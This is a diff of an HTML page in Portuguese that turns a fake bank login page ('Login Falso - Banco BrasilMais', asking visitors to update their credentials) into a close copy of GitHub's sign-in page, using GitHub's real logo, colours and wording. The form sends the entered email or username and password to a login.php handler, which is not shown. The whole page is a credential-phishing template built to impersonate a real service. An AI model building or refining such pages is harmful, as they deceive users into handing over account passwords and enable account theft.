@@ -2,60 +2,107 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Login Falso - Banco BrasilMais</title>
+  <title>Entrar no GitHub</title>
   <style>
     body {
-      background-color: #f0f2f5;
-      font-family: Arial, sans-serif;
+      background-color: #f6f8fa;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
-    .container {
-      width: 400px;
-      margin: 80px auto;
-      padding: 30px;
-      background: white;
-      border-radius: 8px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.2);
-    }
-    h2 {
+    .login-container {
+      width: 360px;
+      background-color: #ffffff;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 24px;
+      box-shadow: 0 1px 0 rgba(27,31,36,0.04);
       text-align: center;
-      color: #005a9c;
     }
-    label {
+    .login-container img.logo {
+      width: 72px;
+      margin-bottom: 16px;
+    }
+    .login-container h1 {
+      font-size: 24px;
+      margin-bottom: 24px;
+      color: #24292f;
+    }
+    .form-group {
+      margin-bottom: 16px;
+      text-align: left;
+    }
+    .form-group label {
       display: block;
-      margin-top: 15px;
+      font-weight: 600;
+      margin-bottom: 6px;
+      color: #24292f;
     }
-    input {
+    .form-group input {
       width: 100%;
-      padding: 10px;
-      margin-top: 5px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
+      padding: 8px 12px;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      font-size: 14px;
+      background-color: #ffffff;
+      color: #24292f;
     }
-    button {
+    .form-group input:focus {
+      border-color: #0969da;
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(9,105,218,0.3);
+    }
+    .login-button {
       width: 100%;
-      margin-top: 20px;
-      padding: 12px;
-      background-color: #005a9c;
-      color: white;
+      padding: 10px 16px;
+      background-color: #2da44e;
       border: none;
-      border-radius: 4px;
+      border-radius: 6px;
+      color: #ffffff;
+      font-weight: 600;
+      font-size: 14px;
       cursor: pointer;
+      transition: background-color 0.2s;
+    }
+    .login-button:hover {
+      background-color: #218639;
+    }
+    .footer-text {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 12px;
+      color: #57606a;
+    }
+    .footer-text a {
+      color: #0969da;
+      text-decoration: none;
+    }
+    .footer-text a:hover {
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Banco BrasilMais</h2>
-    <p style="text-align:center">Atualize suas credenciais de acesso</p>
+  <div class="login-container">
+    <img class="logo" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" alt="GitHub Logo">
+    <h1>Entrar no GitHub</h1>
     <form action="login.php" method="POST">
-      <label for="email">Email :</label>
-      <input type="email" id="email" name="email" required>
-
-      <label for="pass">Senha:</label>
-      <input type="password" id="pass" name="pass" required>
-
-      <button type="submit">Atualizar</button>
+      <div class="form-group">
+        <label for="username">Nome de usuário ou email</label>
+        <input type="text" id="email" name="email" required>
+      </div>
+      <div class="form-group">
+        <label for="password">Senha</label>
+        <input type="password" id="pass" name="pass" required>
+      </div>
+      <button class="login-button" type="submit">Entrar</button>
     </form>
+    <div class="footer-text">
+      <p>Esqueceu sua senha? <a href="#">Redefinir senha</a></p>
+      <p>Novo no GitHub? <a href="#">Criar uma conta</a></p>
+    </div>
   </div>
 </body>
 </html>
